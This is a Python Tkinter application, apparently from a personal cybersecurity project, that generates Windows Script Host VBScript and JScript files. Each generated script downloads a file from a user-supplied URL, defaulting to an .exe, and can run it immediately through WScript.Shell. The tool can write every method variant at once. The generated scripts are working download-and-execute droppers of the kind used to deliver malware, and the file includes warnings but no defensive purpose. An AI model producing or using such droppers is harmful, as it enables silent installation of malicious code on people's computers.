import tkinter as tk
from tkinter import filedialog, messagebox
import os
from urllib.parse import urlparse
import re

# Define the base output directory for the generated scripts
OUTPUT_BASE_DIR = r"E:\Notes\Macros\Cyber Security\Projects\scripts\IE_Scripts_Downloader"

def _write_script_file_content(url, script_type, selected_method, filename, execute_after_download, script_file_path):
    """
    Helper function to generate and write the .vbs or .js file content.
    """
    # Sanitize filename for use within script strings (Windows paths)
    sanitized_filename_for_script = filename.replace("\\", "\\\\").replace("'", "\\'")

    script_content = ""

    if script_type == "VBScript (.vbs)":
        script_content = f'''
' VBScript Download Script generated by Python Tkinter App
' Designed for Windows Script Host (WSH) - cscript.exe or wscript.exe
' WARNING: Directly executing downloaded files can be a security risk.
' URL: {url}
' Method: {selected_method}
' Output File: {filename}

On Error Resume Next

Dim url, outputPath
url = "{url}"
outputPath = "{sanitized_filename_for_script}"

WScript.Echo "Attempting to download '" & url & "' to '" & outputPath & "' using '{selected_method}'..."

'''
        if selected_method == "XMLHTTP & ADODB.Stream":
            script_content += f'''
Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
Dim bStrm: Set bStrm = CreateObject("ADODB.Stream")

xHttp.Open "GET", url, False
xHttp.Send

If Err.Number <> 0 Then
    WScript.Echo "Error during XMLHTTP request: " & Err.Description
    WScript.Quit 1
End If

Const adTypeBinary = 1
bStrm.Type = adTypeBinary
bStrm.Open
bStrm.Write xHttp.ResponseBody
bStrm.SaveToFile outputPath, 2 ' 1 = no overwrite, 2 = overwrite
bStrm.Close

If Err.Number <> 0 Then
    WScript.Echo "Error saving file (ADODB.Stream): " & Err.Description
    WScript.Quit 1
End If

Set bStrm = Nothing
Set xHttp = Nothing
'''
        elif selected_method == "WinHttp.WinHttpRequest.5.1":
            script_content += f'''
Dim objHTTP: Set objHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
Dim objStream: Set objStream = CreateObject("ADODB.Stream")

objHTTP.Open "GET", url, False
objHTTP.Send

If Err.Number <> 0 Then
    WScript.Echo "Error during WinHttp request: " & Err.Description
    WScript.Quit 1
End If

If objHTTP.Status = 200 Then
    objStream.Open
    objStream.Type = 1 ' adTypeBinary
    objStream.Write objHTTP.ResponseBody
    objStream.SaveToFile outputPath, 2 ' adSaveCreateOverWrite
    objStream.Close
Else
    WScript.Echo "Error during download (WinHttp). HTTP Status: " & objHTTP.Status
    WScript.Quit 1
End If

If Err.Number <> 0 Then
    WScript.Echo "Error saving file (ADODB.Stream): " & Err.Description
    WScript.Quit 1
End If

Set objStream = Nothing
Set objHTTP = Nothing
'''
        else:
            raise ValueError(f"Unknown VBScript download method selected: {selected_method}")

        script_content += f'''
WScript.Echo "Download complete: " & outputPath

' --- Execute after download ---
If {str(execute_after_download).lower()} Then
    Dim fso: Set fso = CreateObject("Scripting.FileSystemObject")
    If fso.FileExists(outputPath) Then
        WScript.Echo "Executing downloaded file: " & outputPath
        Dim objShell: Set objShell = CreateObject("WScript.Shell")
        objShell.Run Chr(34) & outputPath & Chr(34), 1, False ' Run in normal window, don't wait
        Set objShell = Nothing
        WScript.Echo "Execution command sent."
    Else
        WScript.Echo "Cannot execute: Downloaded file not found at " & outputPath & "."
    End If
    Set fso = Nothing
End If

WScript.Quit 0
'''

    elif script_type == "JScript (.js)":
        script_content = f'''
// JScript Download Script generated by Python Tkinter App
// Designed for Windows Script Host (WSH) - cscript.exe or wscript.exe
// WARNING: Directly executing downloaded files can be a security risk.
// URL: {url}
// Method: {selected_method}
// Output File: {filename}

var url = "{url}";
var outputPath = "{sanitized_filename_for_script}";

WScript.Echo("Attempting to download '" + url + "' to '" + outputPath + "' using '{selected_method}'...");

try {{
'''
        if selected_method == "XMLHTTP & ADODB.Stream":
            script_content += f'''
    var xHttp = new ActiveXObject("Microsoft.XMLHTTP");
    var bStrm = new ActiveXObject("ADODB.Stream");

    xHttp.open("GET", url, false);
    xHttp.send();

    if (xHttp.status !== 200) {{
        throw new Error("HTTP Status: " + xHttp.status + " " + xHttp.statusText);
    }}

    var adTypeBinary = 1;
    bStrm.type = adTypeBinary;
    bStrm.open();
    bStrm.write(xHttp.responseBody);
    bStrm.saveToFile(outputPath, 2); // 1 = no overwrite, 2 = overwrite
    bStrm.close();

    bStrm = null;
    xHttp = null;
'''
        elif selected_method == "WinHttp.WinHttpRequest.5.1":
            script_content += f'''
    var objHTTP = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
    var objStream = new ActiveXObject("ADODB.Stream");

    objHTTP.open("GET", url, false);
    objHTTP.send();

    if (objHTTP.status === 200) {{
        objStream.open();
        objStream.type = 1; // adTypeBinary
        objStream.write(objHTTP.ResponseBody);
        objStream.saveToFile(outputPath, 2); // adSaveCreateOverWrite
        objStream.close();
        objStream = null;
    }} else {{
        throw new Error("Download failed (WinHttp). HTTP Status: " + objHTTP.status);
    }}
    objHTTP = null;
'''
        else:
            raise ValueError(f"Unknown JScript download method selected: {selected_method}")

        script_content += f'''
    WScript.Echo("Download complete: " + outputPath);
}} catch (e) {{
    WScript.Echo("An error occurred during download: " + e.message);
    WScript.Quit(1); // Exit with an error code
}}

// --- Execute after download ---
if ({str(execute_after_download).lower()}) {{
    var fso = new ActiveXObject("Scripting.FileSystemObject");
    if (fso.FileExists(outputPath)) {{
        WScript.Echo("Executing downloaded file: " + outputPath);
        try {{
            var shell = new ActiveXObject("WScript.Shell");
            shell.Run('"' + outputPath + '"', 1, false); // 1 for normal window, false for no wait
            shell = null;
            WScript.Echo("Execution command sent.");
        }} catch (e) {{
            WScript.Echo("Failed to execute '" + outputPath + "': " + e.message);
        }}
    }} else {{
        WScript.Echo("Cannot execute: Downloaded file not found at " + outputPath + ".");
    }}
    fso = null;
}}

WScript.Quit(0);
'''
    else:
        raise ValueError(f"Unknown script type selected: {script_type}")

    # Write the content to the script file
    with open(script_file_path, 'w') as f:
        f.write(script_content)

def update_method_options(*args):
    """Updates the download method dropdown based on selected script type."""
    selected_script_type = script_type_var.get()
    
    # Clear existing options
    method_dropdown['menu'].delete(0, 'end')

    if selected_script_type == "VBScript (.vbs)":
        new_methods = vbs_download_methods
    elif selected_script_type == "JScript (.js)":
        new_methods = js_download_methods
    else:
        new_methods = [] # Should not happen

    # Add new options
    for method in new_methods:
        method_dropdown['menu'].add_command(label=method, command=tk._setit(method_var, method))
    
    # Set default for new methods
    if new_methods:
        method_var.set(new_methods[0])
    else:
        method_var.set("") # Clear if no methods

def generate_single_script_file():
    """
    Generates a single .vbs or .js file for the selected method, prompting for save location.
    """
    url = url_entry.get()
    script_type = script_type_var.get()
    selected_method = method_var.get()
    execute_after_download = execute_var.get()

    if not url:
        messagebox.showwarning("Input Error", "Please enter a valid URL.")
        return
    if not selected_method:
        messagebox.showwarning("Input Error", "Please select a download method.")
        return

    if not (url.startswith("http://") or url.startswith("https://")):
        messagebox.showwarning("Invalid URL", "URL must start with http:// or https:// for these methods.")
        return
    
    try:
        parsed_url = urlparse(url)
        path_segments = parsed_url.path.split('/')
        filename = path_segments[-1] if path_segments[-1] else "downloaded_file"
        if '.' not in filename:
            filename += ".dat"

        # Sanitize filename for Windows path compatibility
        filename = re.sub(r'[\\/:*?"<>|]', '_', filename)

        file_extension = ".vbs" if script_type == "VBScript (.vbs)" else ".js"
        initial_file_name = f"download_exec_{selected_method.split(' ')[0].lower()}{file_extension}"

        script_file_path = filedialog.asksaveasfilename(
            defaultextension=file_extension,
            filetypes=[(script_type, f"*{file_extension}")],
            initialfile=initial_file_name,
            title=f"Save {script_type} File As"
        )

        if not script_file_path:
            return

        _write_script_file_content(url, script_type, selected_method, filename, execute_after_download, script_file_path)

        messagebox.showinfo(
            "Success",
            f"'{os.path.basename(script_file_path)}' created successfully!\n"
            f"You can find it at: {script_file_path}\n\n"
            f"**IMPORTANT SECURITY WARNING:**\n"
            f"This script can download and execute files on your system.\n"
            f"ONLY run scripts from trusted sources. Double-click to run (or via cscript/wscript)."
        )

    except Exception as e:
        messagebox.showerror("Error", f"An error occurred: {e}")

def create_all_scripts():
    """
    Creates .vbs and .js files for all available download methods in the output directory.
    """
    url = url_entry.get()
    execute_after_download = execute_var.get()

    if not url:
        messagebox.showwarning("Input Error", "Please enter a valid URL to create all files.")
        return

    if not (url.startswith("http://") or url.startswith("https://")):
        messagebox.showwarning("Invalid URL", "URL must start with http:// or https:// for these methods.")
        return

    try:
        os.makedirs(OUTPUT_BASE_DIR, exist_ok=True)

        parsed_url = urlparse(url)
        path_segments = parsed_url.path.split('/')
        base_filename = path_segments[-1] if path_segments[-1] else "downloaded_file"
        if '.' not in base_filename:
            base_filename += ".dat"
        
        base_filename = re.sub(r'[\\/:*?"<>|]', '_', base_filename)

        created_files_count = 0
        failed_methods = []

        # Generate VBScript files
        for method in vbs_download_methods:
            sanitized_method_name = re.sub(r'[\\/:*?"<>|()]', '', method).replace(' ', '_').replace('.', '').replace('&', '')
            script_filename = f"download_exec_vbs_{sanitized_method_name}.vbs"
            script_file_path = os.path.join(OUTPUT_BASE_DIR, script_filename)
            try:
                _write_script_file_content(url, "VBScript (.vbs)", method, base_filename, execute_after_download, script_file_path)
                created_files_count += 1
            except Exception as e:
                failed_methods.append(f"VBScript ({method}) ({e})")
        
        # Generate JScript files
        for method in js_download_methods:
            sanitized_method_name = re.sub(r'[\\/:*?"<>|()]', '', method).replace(' ', '_').replace('.', '').replace('&', '')
            script_filename = f"download_exec_js_{sanitized_method_name}.js"
            script_file_path = os.path.join(OUTPUT_BASE_DIR, script_filename)
            try:
                _write_script_file_content(url, "JScript (.js)", method, base_filename, execute_after_download, script_file_path)
                created_files_count += 1
            except Exception as e:
                failed_methods.append(f"JScript ({method}) ({e})")

        success_message = f"Successfully created {created_files_count} script files in:\n{OUTPUT_BASE_DIR}"
        if failed_methods:
            success_message += "\n\nFailed to create files for the following methods:\n" + "\n".join(failed_methods)
            messagebox.showwarning("Partial Success", success_message)
        else:
            messagebox.showinfo("Success", success_message)

    except Exception as e:
        messagebox.showerror("Error", f"An error occurred while creating all files: {e}")

# --- GUI Setup ---
app = tk.Tk()
app.title("Windows Script Host Downloader/Executor Generator")
app.geometry("800x550") # Adjusted size
app.resizable(False, False)

# Configure grid for better layout
for i in range(6):
    app.grid_rowconfigure(i, weight=1)
app.grid_columnconfigure(0, weight=1)
app.grid_columnconfigure(1, weight=3)

# URL Label
url_label = tk.Label(app, text="Enter File URL:")
url_label.grid(row=0, column=0, padx=10, pady=10, sticky="e")

# URL Entry
url_entry = tk.Entry(app, width=50)
url_entry.grid(row=0, column=1, padx=10, pady=10, sticky="w")
url_entry.focus_set()
url_entry.insert(0, "https://www.example.com/sample.exe") # Default URL

# Script Type Label and Radiobuttons
script_type_label = tk.Label(app, text="Select Script Type:")
script_type_label.grid(row=1, column=0, padx=10, pady=5, sticky="e")

script_type_var = tk.StringVar(app)
script_type_var.set("VBScript (.vbs)") # Default script type
script_type_var.trace_add("write", update_method_options) # Update methods when type changes

vbs_radio = tk.Radiobutton(app, text="VBScript (.vbs)", variable=script_type_var, value="VBScript (.vbs)")
vbs_radio.grid(row=1, column=1, padx=10, pady=0, sticky="w")
js_radio = tk.Radiobutton(app, text="JScript (.js)", variable=script_type_var, value="JScript (.js)")
js_radio.grid(row=2, column=1, padx=10, pady=0, sticky="w")


# Download Method Label
method_label = tk.Label(app, text="Select Download Method:")
method_label.grid(row=3, column=0, padx=10, pady=10, sticky="e")

# Download Method Dropdown (OptionMenu)
vbs_download_methods = [
    "XMLHTTP & ADODB.Stream",
    "WinHttp.WinHttpRequest.5.1"
]
js_download_methods = [
    "XMLHTTP & ADODB.Stream", # JScript equivalent using ActiveXObject
    "WinHttp.WinHttpRequest.5.1" # JScript equivalent using ActiveXObject
]
method_var = tk.StringVar(app)
method_var.set(vbs_download_methods[0]) # Set initial default based on VBScript

method_dropdown = tk.OptionMenu(app, method_var, *vbs_download_methods) # Initialize with VBScript methods
method_dropdown.config(width=40) # Adjust width
method_dropdown.grid(row=3, column=1, padx=10, pady=10, sticky="w")

# Execute After Download Checkbox
execute_var = tk.BooleanVar() # Variable to store checkbox state
execute_checkbox = tk.Checkbutton(app, text="Execute after download (WARNING: Security Risk)", variable=execute_var)
execute_checkbox.grid(row=4, column=1, padx=10, pady=5, sticky="w")

# Buttons
generate_button = tk.Button(app, text="Generate Single Script File", command=generate_single_script_file)
generate_button.grid(row=5, column=0, columnspan=2, pady=10)

create_all_button = tk.Button(app, text="Create All VBS/JS Methods", command=create_all_scripts)
create_all_button.grid(row=6, column=0, columnspan=2, pady=10)

# Initial update of method options
update_method_options()

# Run the application
app.mainloop()
